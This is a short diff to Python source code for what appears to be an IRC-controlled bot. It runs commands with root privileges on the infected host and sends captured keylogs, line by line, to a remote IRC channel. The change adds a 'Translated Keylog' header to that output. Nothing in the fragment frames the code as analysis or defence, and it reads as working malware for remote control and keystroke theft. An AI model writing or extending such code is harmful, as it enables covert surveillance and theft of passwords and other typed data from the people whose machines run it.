@@ -188,6 +188,8 @@ ms -- Show the root module.
 		self.root_command(cmd)
 		txt = "Command %s executed." % cmd
 		self.print_irc(c, channel, txt, dcc)
+		txt = " --- Translated Keylog --- "
+		self.print_irc(c, channel, txt, dcc)
 		for k in self.keylogs().split('\n'):
 			if None == k:
 				txt = "Log empty."
